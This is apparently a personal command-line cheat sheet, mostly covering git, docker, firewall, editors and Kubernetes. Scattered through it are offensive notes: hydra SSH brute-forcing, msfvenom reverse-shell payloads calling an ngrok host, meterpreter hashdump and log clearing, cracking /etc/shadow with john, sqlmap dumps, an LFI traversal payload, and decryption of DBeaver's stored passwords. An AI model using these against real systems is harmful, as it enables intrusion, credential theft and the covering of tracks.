        - file name: git diff --staged --name-only
	- clean untracked files
		- git clean -f
    - clean untracked files and directories
        - git clean -fd
    - discard uncommited changes
        - git restore abc.txt
        - everything: git restore .
	- set account login cache timeout
		- git config --global credential.helper 'cache --timeout=7200'
	- if require ssh key files:
		- ssh-agent bash -c 'ssh-add ~/keys/abc; git pull'
	- see commit history log: git log
		- pretty print: git log --all --graph --decorate --oneline
	- see changes: git show
		- specific commit: git show 00abcdef
	- stash single file: git stash -- abc
	- stash all: git stash --all
    - temp stash (for switching branch):
        - stash save "save changes"
            - retrieve: 
                - check number: git stash list
                - apply stash and pop from stack: git stash pop stash@{n}
                - {https://stackoverflow.com/questions/11269256/how-to-name-and-retrieve-a-stash-by-name-in-git}
        - git pull / git merge / git checkout
        - stash pop (retrieve save)
	- revert: git revert --no-comit abc123..HEAD
	- branching:
		- new branch: git checkout -b newbranch
		- start from scratch: git checkout --orphan rewrite
		- push to new branch: git push -u origin newbranch
		- list: git branch
		- remove: git branch -d xyz
		- merge to specific commit: git merge 123abc
			- ignore commits: git merge -s ours 123abc
			- skip conflict: git merge master -X ours
		- branch to specific commit: git checkout abc
			- git checkout -b old
		- rename branch: git branch -m newname
		
    - reset file: git checkout -- file
	- stash changes : git stash --keep-index
	- rebase:
		- git rebase --interactive 'bbcda344'
		- git commit --all --amend --no-edit
		- git rebase --continue
		- git push --force
		- rebase back to master: rebase master
	- prompt login: git config --global credential.helper cache
		- prompt again after 1 hour: git config --global credential.helper 'cache --timeout=3600'
    - untrack file
        - git rm envfile --cached
	- permission: git add --chmod=+x file
	- rename: git mv -f abc Def
	- change latest commit message: git commit --amend
	- ignore: git update-index --skip-worktree env
		- track again: git update-index --no-skip-worktree env
        - switch branch
            - turn off skip worktree first (track again)
            - git stash save "save changes"
            - git merge / pull / checkout
            - git stash pop
            - git ignore skip worktree (dont track)
            - {https://stackoverflow.com/questions/35690736/handling-changes-to-files-with-skip-worktree-from-another-branch}
    - delete current(top) commit:
        - git reset --hard HEAD~1
        - undo commit and put everything back into staging: git reset --soft HEAD~1
        - {https://stackoverflow.com/questions/1338728/delete-commits-from-a-branch-in-git,https://docs.gitlab.com/ee/topics/git/rollback_commits.html}
    - tag:
      - display list of tags: git tag
      - sign tag: git tag -s v0.1 -m "version 0.1"
      - tag current commit: git tag -a v0.1 -m "version 0.1"
      - delete tag: git tag -d v0.1
      - tag specific commit: git tag -a v0.3 09e6 -m "version 0.3"
      - push tags: git push --tags
    - commit
        - semantic:
            - feat: (new feature for the user, not a new feature for build script)
            - fix: (bug fix for the user, not a fix to a build script)
            - docs: (changes to the documentation)
            - style: (formatting, missing semi colons, etc; no production code change)
            - refactor: (refactoring production code, eg. renaming a variable)
            - test: (adding missing tests, refactoring tests; no production code change)
            - chore: (updating grunt tasks etc; no production code change)

            - build: Changes that affect the build system or external dependencies (example scopes: gulp, broccoli, npm)
            - ci: Changes to our CI configuration files and scripts (example scopes: Travis, Circle, BrowserStack, SauceLabs)
            - docs: Documentation only changes
            - feat: A new feature
            - fix: A bug fix
            - perf: A code change that improves performance
            - refactor: A code change that neither fixes a bug nor adds a feature
            - style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)
            - test: Adding missing tests or correcting existing tests

- checkinstall
	- create deb without installing: make -> checkinstall --install=no
- usermod : modify user
	- add user to group : usermod -a -G group user
		- multiple groups: usermod -a -G g1,g2,g3 user
- groups: check user groups
	- groups user
- see all groups on system: getent group
- see ports in use : sudo lsof -i -P -n
	- netstat: netstat -tulpn |grep LISTEN
	- ss: ss -lntu
        - ss -tulpn
- check process opened port :
	- check pid: fuser 3306/tcp
	- ls -l /proc/3141/exe
- ufw: firewall
	- start: ufw enable
    - default deny all incoming: sudo ufw default deny incoming
    - check status: ufw status
    - reset: sudo ufw reset
    - only allow ssh for certain ip: sudo ufw allow from 123.456.7.8 proto tcp to any port 22
        - restrict to only allow tcp ssh protocol
    - list rules with numbers: ufw status numbered
    - delete rule: ufw delete <number>
    - {https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-with-ufw-on-ubuntu-18-04#:~:text=By%20default%2C%20UFW%20is%20set,to%20reach%20the%20outside%20world.}
    - {https://www.digitalocean.com/community/tutorials/ufw-essentials-common-firewall-rules-and-commands}
    - {https://linuxhint.com/ufw_list_rules/}
- remove all folders : rm -R -- */
- count lines from grep: grep abc | wc -l
- fix broken install: apt --fix-broken install
- tsc : ts -> js transpiler
	- tsc --lib ESNext foo.ts
		- multi-lib: tsc --lib ESNext,dom bar.ts
	- tsc --outDir dist --target es5 --module ES6 --lib esnext test.ts
- gotop:
	- sorting:
		- cpu : c
		- memory: m
		- pid: p
- get gpu info: sudo lshw -C display
- see logged in users: w
- see running process:
	- ps aux |grep node
	- pgrep node
- inspect program with memory usage:
    - ps -eo pmem,comm,pid,maj_flt,min_flt,rss,vsz --sort rss 
        - sort high to low: -rss
    - top 10: ps -eo pmem,comm,pid,maj_flt,min_flt,rss,vsz --sort -rss |head -n 10
    - with numft: ps -eo pmem,comm,pid,maj_flt,min_flt,rss,vsz --sort -rss |head -n 10 |grep -v "Isolated Web"| numfmt --header --to=
iec --field 4-5 | numfmt --header --from-unit=1024 --to=iec --field 6-7 | column -t
    - ps -eo pmem,comm,pid,maj_flt,min_flt,rss,vsz --sort -rss |grep -v "Isolated Web"| numfmt --header --to=iec --field 
4-5 | numfmt --header --from-unit=1024 --to=iec --field 6-7 | column -t|head -n 20
- top lines in command: cmd |head -n 10
- see working dir of running process: pwdx 3461
	- pipe pgrep: pgrep node |xargs pwdx
- npx : npm package runtime
- pnpm : alternate to npm
- see shell using: ps -p $$
	- echo $0
- change default shell: chsh
	- specific user: chsh -s /bin/zsh foobar
- ffsend (firefox send)
	- upload: ffsend upload abc.txt
	- history: ffsend history
	- download: ffsend download abc.com/abc
	- info: ffsend info abc.com/abc
- emcc:
	- set PATH
		- source ./emsdk_env.sh
			- win: ./emsdk_env.bat
	- update:
		- ./emsdk update
		- ./emsdk install latest
		- ./emsdk activate latest
		- set PATH
- stop process : kill
	- if kill doesnt work:  kill -s QUIT 1234
	- if still doesnt work: sudo pkill -f uwsgi -9
- fdisk
	- list : fdisk -l
	- delete partition: d
	- new partition: n -> p -> Enter -> size (e.g +200G)
	- set swap to parition: t -> (number) -> 82
	- finish (write parition): w
- startx: start X session
- acpi: get battery level
- set x keymap: setxkbmap -layout gb
- nitrogen: set wallpaper
- redis-server : start redis server
	- redis-cli
		- host: redis-cli -h xxx.com -p 6379
- rg (ripgrep): fast recursive regex searcher
	- rg foobar
	- e.g:
		- ls -ltrha |rg "Abc|def" -i
		- rg -uu -F "abc"
	- rg -uu -F "sss"
	- ignore gitignore: -uu

- apt install from another source: -t <SOURCE>
	- sudo apt -t stretch-backports install redis
- diff : difference between files/dir
	- diff f1 f2
	- dir: diff -r d1 d2
- colordiff : diff but with colours
- code-server: visual studio code server
	- specify port: -p
	- code-server -p 9001 ~/Documents
- browsh : firefox-headless in terminal
	- exit: C-h
	- focus url: C-l
	- go back: backspace
	- reload: C-r
	- new tab: C-t
	- close tab: C-w
	- next tab: C-\
- abduco:
	- list sessions
	- start: abduco -c austin dvtm
	- detach: Ctrl-\
	- attach: abduco -a austin
- dvtm
	- Ctrl+g:
		- create window: c
			- same dir: C
		- to session no: v <NUMBER>
		- cycle next: j
		- cycle back: k
		- inc size: l
		- dec size: h
		- min/max: .
        - tagging:
            - to tag: <NUMBER>
            - view all: 0
            - apply tag: t <NUMBER>
            - add/rem tag from VIEW: V <NUMBER>
            - add/rem tag to focused: T <NUMBER>
        - quit: qq
        - kill window: xx
        - prev window: <TAB>
        - hide/show status bar: s
        - mouse mode: M
        - toggle between master/slave : <ENTER>
        - layouts:
			- cycle through: <SPACE>
			- vertical stack: f
				- master on left, rest share space on right
			- bottom stack: b
				- master on top, rest share bottom
			- grid: g
				- equal space
			- monocole: m
				- fullscreen
		- scroll: pgUp or pgDn
        - edit mode: e
- find : find files
    - find /home/austin/Downloads/ -name "*foobar*"
    - find / |grep abc
    - with size: find / -size 33c
    - ignore errors: find / 2>/dev/null
    - find readable: find / -readable 2>/dev/null
        - find /  -size 33c -perm u+r 2>/dev/null
    - find and exec: find / -size 33c ! -perm /111 -exec file '{}' \; 2>/dev/null
    - find SUID file: find / -perm /4000
    - find file with name: find / -name myfile 2>/dev/null
      - wildcard: find / -name *file 2>/dev/null
    - set max depth: find ~/ -maxdepth 2 -name '*rc'
- patch : patch -Np1 -i abc.diff
- feh : image viewer
    - set wallpaper: feh --bg-scale picture.png
    - zoom in/out: up/down arrow
    - scroll up/down: alt + up/down arrow
- sxiv: another image viewer
    - zoom in/out: +/-
    - max zoom in: =
    - move around: hjkl
    - flip horizontally: |
    - flip vertically: _
    - fullscreen: f
    - fit window width: e
    - fit window height: E
    - fit window: W
    - rotate anti-clockwise 90deg: <
    - rotate clockwise 90deg: >
    - rotate 180deg: ?

- xdg-mime: default app handler
    - xdg-mime default sxiv.desktop image/png image/jpeg image/jpg image/svg
- get news: curl getnews.tech
- unimatrix
	- lines move at diff speed: a
	- bold char: b
- xbps : void package manager
    - search: xbps-query -Rs foobar
    - update/install: xbps-install -Su
- pm2
    - monitoring: monit
    - lists: list
    - start
    - stop
    - restart
    - npm start: pm2 start npm -- start
- free memory
    - free -h
    - free -h |awk '{print $1"\t"$2}'|sed -n '2,3p'
- cowsay
    - list cows: -l
    - use cow: -f
    - pipe watch: watch -n 5 'free -h|cowsay'
- date 
    - date '+Time now is %I:%M %p'
- farbfeld
	- encode: png2ff
		- png2ff < abc.png > abc.ff
		- png2ff < abc.png | bzip2 -9 -k > abc.ff.bz2
		- png2ff < abc.png | bzip3 -e -b 511 -j 4 > abc.ff.bz3
	- decode: ff2png
		- ff2png < abc.ff > abc.png
		- bzcat abc.ff.bz2 | ff2png > abc.png
                - view image: bzcat abc.ff.bz2 |lel
    - for loop
        - fish: for i in *.PNG;png2ff < $i | bzip2 -9 > (basename $i .PNG).ff.bz2;end
- lel: farbfeld image viewer
    - view image: bzcat abc.ff.bz2 |lel
- mtm
    - ctrl + g :
        - split horizontal | : h
        - split vertical - : v
        - close: w
        - redraw: l
        - navigate: <ARROWS>
- amp : modal based text editor
    - quit: shift + q
    - command mode: 0
        - config: preferences::edit
    - save: s
- ukuu : update kernel
    - ukuu --install-latest
- slabtop : cache memory top
- ncc
	- ncc build index.js
- make
    - use multi cores: make -j 4
- cq (csv query tool)
    - cq foo.csv -q 'select count(*) from foo' -o column
    - get columns: pragma table_info(foo)
- fontforge
    - nerdfont patch: fontforge -script font-patcher -c -w foo.ttf
- sed
    - add line to beginning to file: sed -i '1ifoobar' file
    - remove 1st line:  sed -i '1d' file
    - add comma to end of each line(apart from last) :  sed -i.bak '$!s/$/ ,/' file
    - replace one line: sed 'Ns/.*/replacement-line/' file.txt > new_file.txt
        - N = line number
    - read single line: sed -n '1{p;q}' file
- ssconvert (gnumeric) : spreadsheet convert
    - ssconvert a.xlsx a.csv
- pkill
    - remove pid: pkill -9 1234
    - remove tty: pkill -9 -t pts/0
- emcc: wasm compiler
    - emcc test.c -o test.js -O3 -s WASM=1 -s EXPORTED_FUNCTIONS="['_times','_add','_ping']" -s EXTRA_EXPORTED_RUNTIME_METHODS='["cwrap","getValue"]' -s ASSERTIONS=1
- mpv
    - play dir (music) : mpv . --no-audio-display
    - next : >
    - prev: <
    - play/pause: p / <SPACE>
    - screenshot: s
 - qrencode
    - wireguard: sudo cat /etc/wireguard/clients/user0/user0.conf | qrencode -t ansiutf8
- musikcube
    - pause/play: space
    - quit: ctrl + d
    - prev track: j
    - next track: l
    - volume up: i
    - volume down: k
- wireguard : wg
	- show connected : sudo wg show wg0
- docker
    - build: docker build -t imagename .
	- buildx:
		- create: docker buildx create --name newbuilder
		- set builder: docker buildx use newbuilder
		- inspect: docker buildx inspect --bootstrap
		- build: docker buildx build --platform linux/arm64 -t test_arm .
			- push : --push
			- multiplatform: --platform linux/amd64,linux/arm64
		- enable multiarch:
			- docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
			- docker buildx rm builder
			- docker buildx create --name builder --driver docker-container --use
			- docker buildx inspect --bootstrap
    - run container: docker container run -p 80:80 -d --name containername imagename
	- run: docker run -p 8000:1234 -e PORT=1234 foobar
    - list images: docker image list
    - delete: docker rmi imagename
    - running containers: docker ps -a
    - get logs: docker logs containerid
		- follow: docker logs -f containerid
    - remove container: docker container rm --force containername
	- run interactive: docker run -it --entrypoint /bin/sh imagename
	- ssh into running container: docker exec -it containername /bin/sh
	- restart: docker restart containername
	- remove unused/None images: docker image prune
	- remove stopped containers :  docker rm (docker ps -a -q)
	- remove by search:  docker image list |grep foobar |awk '{print $1}'|xargs docker image rm
    - clean up: docker system prune -a
    - clean volume: docker volume prune -f
	- run without sudo:
		- sudo groupadd docker
		- sudo gpasswd -a $USER docker
		- sudo service docker restart
			- sudo systemctl enable docker.service
			- sudo sytemctl restart docker.service
	- export image: docker save foobar > foobar.tar
		- compress: docker save foo:latest|xz -9 -T 0 -e - > foo.tar.xz
	- import : docker load < foo.tar
	- remove network: docker network rm (docker network ls -q)
- save to outpu: >
- append output to file : >>
- read input from file : <
- redirect error messages: 2>
- pipe output as input to another program: |
- ngrok : ngrok tcp 22
    - with region: ngrok tcp 22 -region=ap
- nethogs : monitor network
- siege : stress test tool
	- siege -c50 -t60S --content-type "application/json" 'http://domain.com/path/to/json.php POST {"ids": ["1","2","3"]}'
    - POST json file input: siege -c2 -t10s --content-type "application/json" 'https://api.test.xyz/run POST < ./test.json'
- protoc: protobuffer
    - install:
      - go install google.golang.org/protobuf/cmd/protoc-gen-go
      - go install google.golang.org/grpc/cmd/protoc-gen-go-grpc
      - {https://grpc.io/docs/languages/go/quickstart/}
    - protoc --go_out=. --go-grpc_out=. ./foobar/proto/hello.proto
    - protoc --go-grpc_out=. ./foo/proto/foo.proto
    - protoc --go_out=plugins=grpc:. YOUR_ROOT_FOLDER/hellopb/hello.proto
- go: golang
	- cross compile: GOOS=linux GOARCH=arm64 go build -o ./bin/app_arm64
    - powershell: $Env:GOOS = "linux"; $Env:GOARCH = "arm64"; go build -o .\bin\app_arm64
- slack-term: slack terminal client
    - scroll chat up: ctrl + u
    - scroll chat down: ctrl + d
    - insert mode: i
- helm
    - add repo: helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
    - update: help repo update
    - install: helm install nginx-ingress ingress-nginx/ingress-nginx --namespace kube-system --set defaultBackend.enabled=false
    - list: helm list -n kube-system
        - all: helm ls -A
    - get existing values: helm get values grafana -n monitor
    - get all existing values: helm get values grafana -n monitor -a
- ix.io: sane text paste service
    - cat ~/.config/mimeapps.list |curl -F 'f:1=<-' ix.io
- hydra: password cracker (bruteforce)
    - crack ssh: hydra -t 4 -l root -P /home/user/password.txt 192.168.1.1 ssh
      - with username list: hydra -L usernames.txt -P passwords.txt 192.168.1.1 ssh
- uniq: find adjacent unique lines in file
    - find number of occurences of a line inside a file:
        - sort file.txt|uniq -c
        - only the unique line: sort file.txt|uniq -c|grep "\ 1\ "
        - or simply: sort file.txt|uniq -u
    - only print duplicated lines(one of each group): uniq -d
    - print all duplicated lines: uniq -D
- strings: print out all human readable strings from a file
- xxd: create hexdump from binary or reverse
    - reverse hexdump back to binary: xxd -r data.dump data
- file: determine file type
- openssl
    - send string and get response : echo "YOUR TEXT HERE" | openssl s_client -connect host:port-ign_eof
- nc: netcat
    - listen on port: nc -lvvp 3345
    - listen on port and send string to client on connection:
        - echo "welcome" | nc -lvvp 2245
    - pipe stdout to nc: while true;ping -c3 google.com;sleep 5;end |nc -lvnp 3128
    - connect to server: nc -v localhost 3128
- socat:
    - pipe stdout to socat: while true;ping -c3 google.com;date;sleep 5;end | socat - TCP-LISTEN:3128,reuseaddr,fork
    - listen on port: socat TCP-LISTEN:3128,reuseaddr,fork -
- msfconsole: metasploit
    - go to session: sessions -i 3
    - sessions: sessions
    - send session to background: bg
    - send normal shell to background: ctrl+z
    - shell to interpreter:
      - use post/multi/manage/shell_to_meterpreter
      - set SESSION 2
      - {https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646}
    - meterpreter:
        - set handler: use exploit/multi/handler
        - php: set payload php/meterpreter/reverse_tcp
        - exploit: exploit -j
            - -j flag sends to background
        - post exploit:
            - migrate to another process:
              - run post/windows/manage/migrate
              - migrate to process ID: migrate 3008
            - sysinfo
            - edit myfile
            - get privilege: getsystem
            - spawn shell: shell
            - running processes: ps
            - clear logs: clearev
            - get user info: getuid
            - download files: download file.txt
            - upload files: upload file.txt
            - hashdumping:
              - hashdump
              - run post/windows/gather/hashdump
        - backgorund session: bg
        - go into session: sessions -i 2
- msfvenom:
    - windows: msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 25 LHOST=0.tcp.ngrok.io LPORT=12345 -f exe > 1.exe
    - php: msfvenom -p php/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f raw -o page.php
- john: john the ripper (password hashdump cracker)
  - displayed results of file: john --show ./hash.txt
  - windows type hashes: --format=NT
  - md5: john hash.txt --format=raw-md5 --wordlist=./rockyou.txt
  - use wordlist: john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt
  - crack /etc/shadow:
    - shadow.txt: /etc/shadow shadow.txt
    - passwd.txt: /etc/passwd
    - unshadow passwd.txt shadow.txt > unshadowed.txt
    - john --wordlist=rockyou.txt unshadowed.txt
  - {https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c}
- hashcat: hash cracker
  - hashcat -m 0 hash.txt ~/Documents/rockyou.txt
- qemu
    - convert vmware disk to qcow2
        - qemu-img convert -O qcow2 abc.vmdk abc.qcow2
    - run image: qemu-system-x86_64 -hda ./abc.vmdk -nic user
    - release cursor focus from window: ctrl + alt + g
- nikto: web server vulnerability scanner
  - nikto -h 192.168.1.2
- dirb: web directory scanner
  - dirb http://192.168.1.2
- sqlmap: auto sql injection + exploit tool
  - check captured request: sqlmap -r req.txt
  - enumerate db: sqlmap -r req.txt --dbs --batch
  - dump all from table: sqlmap -r req -D users --dump-all --batch
  - e.g: sqlmap -u "http://192.168.1.18/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
  - dump all: sqlmap -u "http://192.168.3.5/results.php" --dbms=MySQL --dump-all --batch --data "search=test" 
- aws: aws cli
    - s3
        - download bucket: aws s3 sync s3://my-bucket-0 . --region ap-east-1 
    - iam
        - create user:
            - aws iam create-user --user-name ccp-ecr-user
            - aws iam create-access-key --user-name ccp-ecr-user
            - aws iam attach-user-policy --user-name ccp-ecr-user --policy-arn arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly
            - {https://github.com/CiscoDevNet/multicloud-integrations/blob/master/AWS/AWSConfig/ecr/ecr-registry-creds.md}
    - ecr
      - create: aws ecr create-repository --repository-name ccp-repo/nginx --region us-east-1
- mkvmerge: get stream info of mkv file
  - mkvmerge -i vid.mkv
- mkvextract: extract streams out of mkv
  - mkvextract tracks vid.mkv 3:3.srt
- sudo -l: list of allowed/forbidden sudo commands
- epr: epub cli reader
    - to read file: epr file.epub
    - next chapter: n
    - previous chapter: p
    - up down: j,k
    - up down (half screen): h,l
- epy: another epub cli reader (fork of epr)
    - table of contents: t
    - scroll up,down: j,k
    - prev,next chapter: L H
- sdcv: stardict command line dictionary
    - sdcv word
    - setup dictionary:
        - sudo mkdir -p /usr/share/stardict/dic/
        - download dictionary and put files inside the above dir
            - dicts: http://download.huzheng.org/
        - sudo tar xvjf dict.tar.bz2 -C /usr/share/stardict/dic
        - {https://askubuntu.com/questions/191125/is-there-an-offline-command-line-dictionary}
- unshadow: unshadow shadowed file
  - unshadow passwd shadow > unshadowed
- annie: cli video downloader
  - annie "https://www.youtube.com/watch?v=..."
  - playlist: annie -p "PLAYLIST_URL"
    - specify items: annie -items 1,4,8 -p "PLAYLIST_URL"
    - with info: annie -i -p "PLAYLIST_URL"
    - with quality: annie -items 4,5,9 -f 64 -p "PLAYLIST_URL"
  - specify file quality: annie -f 64
  - get info: annie -i "URL"
- gpg: privacy crypto tool
  - list keys: gpg --list-secret-keys --keyid-format LONG
    - all keys: gpg --list-keys
  - delete key: gpg --delete-key ABC1234
    - secret key: gpg --delete-secret-key ABC123
  - renew:
    - gpg --list-secret-keys --keyid-format LONG
    - gpg --edit-key KEYID
        - expire
        - trust
        - save
    - {https://gist.github.com/krisleech/760213ed287ea9da85521c7c9aac1df0}
  - add email:
    - gpg --edit-key KEYID
        - adduid
        - trust
        - sign
        - save


-  write to file in newline: echo -e '\nyarn.lock' >> .gitignore
- megatools
  - get storage size: megadf -u myuser@gmail.com -h
  - sync files from local to cloud: megacopy -u --local ~/files/ --remote /Root/files
  - copy files from cloud to local: megacopy -u --local . --remote /Root/files --download
  - {https://linuxconfig.org/megatools-linux-install-and-basic-introduction}
- base64:
  - decode text: cat file |base64 --decode
  - encode file into single line: base64 ssl/ca.pem |tr -d '\n'

- podman:
  - build multi-arch: podman build --platform linux/amd64,linux/arm64 --format docker --manifest myapp .
  - push: podman manifest push --format v2s2 myapp docker://xxx/myapp:1.0.2
  - remove dangling images: podman rmi (podman images -f 'dangling=true' -q)
  - start service: systemctl --user start podman.socket
- kcat: kafka cli tool
  - list all topics and brokers: kcat -L -b localhost
  - list topic metadaa: kcat -L -t mytopic -b localhost

- kind: local k8s installation
    - create: kind create cluster --config kind-config.yaml --name mycluster0
        - rootless (podman): KIND_EXPERIMENTAL_PROVIDER=podman kind create cluster --config c0.kind.config.yaml --name c0
            - prepare:
                - create /etc/systemd/system/user@.service.d/delegate.conf
                    [Service]
                    Delegate=yes
    - 
        apiVersion: kind.x-k8s.io/v1alpha4
        kind: Cluster
        nodes:
          - role: control-plane
          - role: worker
          - role: worker
    - list clusters: kind get clusters
    - delete cluster: kind delete cluster --name mycluster
    - get nodes: kind get nodes --name cluster0
    - load images: kind load docker-image myimage --name cluster0
- k3d: lightweight k3s wrapped in docker
    - create: k3d cluster create cluster0
    - create multi-node:
        - multi master: k3d cluster create cluster0 --servers 3
        - multi worker: k3d cluster create cluster0 --servers 2 --agents 3
    - delete : k3d cluster delete cluster0
    - import image from docker: k3d image import myimage -c mycluster

- tab-rs: terminal multiplexer
    - list tabs: tab -l
    - go into tab: tab mytab
    - back to fuzzy finder: ctrl+t
    - close tab: tab -w mytab
    - terminate all: tab -W
    - view active tab: echo $TAB
- zellij: terminal workspace
    - new pane: alt+n
        - to right: (ctrl+p) +r
        - to down: (ctrl+p) +d
    - switch to pane: alt + h/j/k/l
    - move pane: ctrl+h
    - resize:
        - bigger: alt +
        - smaller: alt -
- vimdot: graphviz editor
- dot: graphviz
    - convert graph to png: dot -Tpng -o out.png ./file.gv
    - convert graph to svg: dot -Tsvg -o out.svg ./file.gv
- nu: nushell
    - some common useful builtins:
        - which
        - where
        - list: ls
        - ps
        - date
        - sys
        - get
        - zip
    - sort: ls | sort-by size
        - reverse: sort-by size |reverse
    - filter:
        - by size: ls | where size > 10kb
        - by column: ps |where cpu > 10
        - equals: ps |where status == 'Running'
    - get content:
        - get: sys |get host
        - braces: (sys).host
    - help: help zip
    - env:
        - echo $env.PATH
- gobang: TUI db tool
    - scroll: h,j,k,l
        - multi lines: ctrl+u, ctrl+d
    - to top: g
    - to bottom: G
    - extend selection by 1cell to left/down/up/right: H,J,K,L
    - copy cell value: y
    - move focus to left/right: <-, ->
    - move focus to connections: c
    - filter: /
    - help: ?
    - switch to:
        - records: 1
        - columns: 2
        - sql: 3
        - constraints: 4
        - foreign keys: 5
        - indexes: 6
    - config: ~/.config/gobang/config.toml
        [[conn]]
        type = "mysql"
        user = "root"
        host = "localhost"
        port = 3306
        password = "password"
        database = "foo"
- rustc: rust compiler
    - list supported targets: rustc --print target-list
    - list supported cpus: rustc --target=x86_64-unknown-linux-gnu --print target-cpus
- nmtui: network management
- nmcli: network manager cli
    - locate ssid: nmcli dev wifi
    - connect: nmcli device wifi connect APname password password
- unclutter: hide x11 mouse cursor
    - start in background: unclutter &
- animwall: set animated wallpaper
    - config file: ~/.confg/animwall/animwall.conf
    - vertical dual monitor:
        ~/images/wallpaper/1.gif:1920x1080+0+0:0
        ~/images/wallpaper/3.gif:1920x1200+0+1080:0
    - horizontal dual monitor:
        ~/images/wallpaper/1.gif:1920x1080+0+0:0
        ~/images/wallpaper/3.gif:1920x1080+1920+0:0
- cargo: rust package manager
    - update packages: cargo update
- sea-orm-cli:
    - sea generate entity -u postgres://user:password@my.db.instance/mydb -s myschema -o entity/src -v
- vagrant: virtual machine manager
    - vagrant init ubuntu/bionic64
    - start: vagrant up
    - list: vagrant box list
    - ssh into machine: vagrant ssh
        - fix/kitty:
            - vagrant ssh-config > vagrant-ssh
            - kitty +kitten ssh -F vagrant-ssh default
            - {https://stackoverflow.com/questions/10864372/how-to-ssh-to-vagrant-without-actually-running-vagrant-ssh}
    - reboot: vagrant reload
    - save state: vagrant snapshot save mysnapshot
    - delete state: vagrant snapshot delete mysnapshot
    - restore state: vagrant snapshot restore mysnapshot
    - list states: vagrant snapshot list
    - teardown: vagrant destroy
- linkerd
    - check env: linkerd check
- tailscale
    - enable service: sudo systemctl enable --now tailscaled
    - connect: sudo tailscale up
    - get ipv4 addr: tailscale ip -4
    - {https://tailscale.com/download/linux/arch}
- dnf: YUM successor (RPM package manager)
    - install: dnf install <package>
    - update: dnf update (deprecated)
        - dnf update bash -y
    - remove: dnf remove <package>
    - list: dnf list installed
    - search: dnf search <package>
    - info: dnf info <package>
    - check update: dnf check-update
    - remove not required pkgs: dnf autoremove
    - upgrade: dnf upgrade
        - preferred overd dnf update
        - force immediate update of repo list: dnf upgrade --refresh
    - downlod package: dnf download <package>
    - clear cache: dnf clean all

- lchsh: fedora version of chsh
    - sudo lchsh $USER
- ncplayer: notcurses terminal media viewer
    - ncplayer -bpixel aaa.mp4
- wezterm: wez furlong's terminal emulator
    - scroll: SHIFT+pageUP,pageDOWN
    - search: ctrl+shift+f
        - copy: ctrl+shift+c
        - reset: ctrl+u
        - cycle: ctrl+r
- mycli , pgcli / litecli: cli db client
    - export data to csv: \T csv; \o ~/Downloads/site_diary.csv;SELECT * from mytable limit 10;

- ffuf: fast web fuzzer
    - dir: ffuf -ic -w ./dirs.txt -e '' -u "http://192.168.1.2:8080/FUZZ" -r
    - subdomain: ffuf -ic -w ./subdomains.txt -e '' -u "https://www.example.com" -H "Host: FUZZ.example.com" -o example_subdomain.json
    - follow redirect: -r

- valgrind: memory error checker
    - valgrind --leak-check=full --show-leak-kinds=all myExecutable

- last: check last successful login
- lastb: check last failed login
- trivy: vulnerability scanner
    - dir: trivy fs .
    - image: trivy image myimage
    - k8s:
        - entire cluster: trivy k8s --report summary cluster
            - detailed: trivy k8s --report all cluster
        - ns: trivy k8s -n kube-system --report summary all
- grype: vulnerability scanner
    - dir: grype dir:./ --add-cpes-if-none
    - image: grype podman:myimage
- tshark: network analyzer
    - list interfaces: tshark -D
    - capture: tshark -i eth0 -w capture.pcap
    - filter: tshark -i eth0 -f "tcp port 80"
    - display: tshark -r capture.pcap
    - capture over all network: tshark -i any
    - rotate: https://stackoverflow.com/questions/63717503/how-to-export-tshark-objects-without-stopping-it
    - filters:
        - source IP: tshark -r cap.pcap ip.src="192.168.1.1"
        - dest IP: tshark -r cap.pcap ip.dst="192.168.1.1"
    - examples:
        - capture with host and export http objects: sudo tshark -f "host 192.168.1.123 and tcp port 80" --expo
rt-objects http,objs

---------------------------------------------------------------------
retrieve dbeaver password
---------------------------------------------------------------------
- openssl aes-128-cbc -d -K babb4a9f774ab853c96c2d653dfe544a -iv 00000000000000000000000000000000 -in ~/.local/share/DBeaverData/workspace6/General/.dbeaver/credentials-config.json
- [https://stackoverflow.com/questions/39928401/recover-db-password-stored-in-my-dbeaver-connection]

---------------------------------------------------------------------
podman setup
---------------------------------------------------------------------
- rootless
  - sudo touch /etc/subuid /etc/subgid
  - sudo usermod --add-subgids 100000-165535 --add-subuids 100000-165535 austin
  - podman system migrate
- multi-arch build
  - install:
    - qemu-user-static 
    - binfmt-qemu-static

---------------------------------------------------------------------
ntfy.sh send notifications
---------------------------------------------------------------------
- curl -d "test abc" ntfy.sh/testing

---------------------------------------------------------------------
k8s private image registry setup
---------------------------------------------------------------------
create secret
- kubectl create secret docker-registry regcred --docker-server=<your-registry-server> --docker-username=<your-name> --docker-password=<your-pword> --docker-email=<your-email> --namespace <namespace>
- add (same level as container):
  imagePullSecrets:
    - name: regcred

---------------------------------------------------------------------
Neovim clean/uninstall settings
---------------------------------------------------------------------
- rm -rf ~/.config/nvim
- rm -rf ~/.local/share/nvim
- rm -rf ~/.cache/nvim

---------------------------------------------------------------------
check github repo forks stats
---------------------------------------------------------------------
- go to forks page
- run in console:
javascript:(async () => {
  /* while on the forks page, collect all the hrefs and pop off the first one (original repo) */
  const aTags = [...document.querySelectorAll('div.repo a:last-of-type')].slice(1);

  for (const aTag of aTags) {
    /* fetch the forked repo as html, search for the "This branch is [n commits ahead,] [m commits behind]", print it directly onto the web page */
    await fetch(aTag.href)
      .then(x => x.text())
      .then(html => aTag.outerHTML += `${html.match(/This branch is.*/).pop().replace('This branch is', '').replace(/([0-9]+ commits? ahead)/, '<font color="#0c0">$1</font>').replace(/([0-9]+ commits? behind)/, '<font color="red">$1</font>')}`)
      .catch(console.error);
  }
})();

---------------------------------------------------------------------
get user account passwords (linux)
---------------------------------------------------------------------
- /etc/shadow

---------------------------------------------------------------------
LFI (Local File Inclusion)
---------------------------------------------------------------------
- ?file=../../../../../etc/passwd

---------------------------------------------------------------------
escape ksh (korn shell)
---------------------------------------------------------------------
